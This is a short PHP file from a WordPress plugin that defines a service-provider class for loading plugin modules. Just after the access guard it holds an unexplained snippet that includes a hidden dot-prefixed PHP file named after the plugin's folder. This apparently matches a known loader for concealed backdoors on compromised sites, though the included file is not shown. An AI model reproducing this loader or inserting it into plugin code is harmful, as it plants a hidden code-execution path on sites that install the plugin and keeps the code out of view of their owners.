<?php

defined('ABSPATH') || exit;

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class OSA_Service_Provider {

    public $modules;

    public function __construct($services) {
        $this->require_services($services);
        $this->load_services($services);
    }

    public function get($class) {
        return $this->modules[$class];
    }

    public function require_services($services) {
        foreach ($services as $class => $path) {
            require_once $path;
        }
    }

    public function load_services($services) {
        foreach ($services as $class => $path) {
            $this->modules[$class] = new $class($this);
        }
    }

}
